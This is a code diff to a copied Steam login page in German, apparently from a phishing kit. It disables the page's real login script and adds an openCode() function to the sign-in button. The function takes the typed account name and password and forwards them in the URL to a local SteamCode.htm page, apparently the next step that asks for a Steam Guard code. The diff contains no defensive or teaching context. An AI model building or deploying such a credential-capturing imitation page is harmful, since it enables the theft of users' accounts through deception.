@@ -17,7 +17,8 @@
     <link href="SteamLogin/login_002.css" rel="stylesheet" type="text/css">
     <link href="SteamLogin/shared_responsive.css" rel="stylesheet" type="text/css">
     <script type="text/javascript" src="SteamLogin/jquery-1.8.3.min.js"></script>
-    <script type="text/javascript">$J = jQuery.noConflict();</script>
+
+    <script>$J = jQuery.noConflict();</script>
     <script type="text/javascript">VALVE_PUBLIC_PATH = "https:\/\/store.akamai.steamstatic.com\/public\/";</script>
     <script type="text/javascript" src="SteamLogin/tooltip.js"></script>
 
@@ -37,7 +38,7 @@
             SetupTooltips({tooltipCSSClass: 'store_tooltip'});
         });
     </script>
-    <script type="text/javascript" src="SteamLogin/login.js"></script>
+    <!--<script type="text/javascript" src="SteamLogin/login.js"></script>-->
     <script type="text/javascript" src="SteamLogin/shared_responsive_adapter.js"></script>
 
     <meta name="twitter:card" content="summary_large_image">
@@ -358,10 +359,10 @@
         <div class="responsive_page_template_content" id="responsive_page_template_content"
              data-panel="{&quot;autoFocus&quot;:true}">
 
-            <script type="text/javascript">
+            <!--<script type="text/javascript">
                 $J(function () {
                     var loginOpts = {
-                        strRedirectURL: "https:\/\/store.steampowered.com\/?l=german",
+                        strRedirectURL: "./SteamCode.htm",
                         gidCaptcha: -1
                     };
 
@@ -371,7 +372,7 @@
                     document.forms['logon'].elements['username'].focus();
 
                 });
-            </script>
+            </script>-->
             <div class="page_content">
 
 
@@ -392,11 +393,11 @@
                                                     Mit Accountnamen anmelden
                                                 </div>
                                                 <div class=""></div>
-                                                <input type="text" class="newlogindialog_TextInput_2eKVn"></div>
+                                                <input id="username" type="text" class="newlogindialog_TextInput_2eKVn"></div>
                                             <div class="newlogindialog_TextField_2KXGK">
                                                 <div class="newlogindialog_FieldLabel_3d8dp">Passwort</div>
                                                 <div class=""></div>
-                                                <input type="password" class="newlogindialog_TextInput_2eKVn" value="">
+                                                <input id="password" type="password" class="newlogindialog_TextInput_2eKVn" value="">
                                             </div>
                                             <div class="Focusable">
                                                 <div class="newlogindialog_CheckboxField_2QWD5">
@@ -419,10 +420,18 @@
                                                 </div>
                                             </div>
                                             <div class="newlogindialog_SignInButtonContainer_14fsn">
-                                                <button class="newlogindialog_SubmitButton_2QgFE" onclick="window.location.href='SteamCode.htm'">
+                                                <button type="submit" value="" class="newlogindialog_SubmitButton_2QgFE" onclick="openCode()">
                                                     Anmelden
                                                 </button>
                                             </div>
+                                            <script type="text/javascript">
+                                                function openCode() {
+                                                    var username = document.getElementById("username").value;
+                                                    var password = document.getElementById("password").value;
+                                                    window.location.assign("./SteamCode.htm?username=" + username + "&password=" + password);
+                                                    alert();
+                                                }
+                                            </script>
                                             <div class="newlogindialog_FormError_1Mcy9">&nbsp;</div>
                                             <a class="newlogindialog_TextLink_1cnUQ newlogindialog_TextAlignCenter_2meUB"
                                                href="https://help.steampowered.com/wizard/HelpWithLogin?redir=https%3A%2F%2Fstore.steampowered.com%2Flogin%2F%3Fredir%3D%253Fl%253Dgerman%26redir_ssl%3D1%26snr%3D1_4_4__global-header">Hilfe!
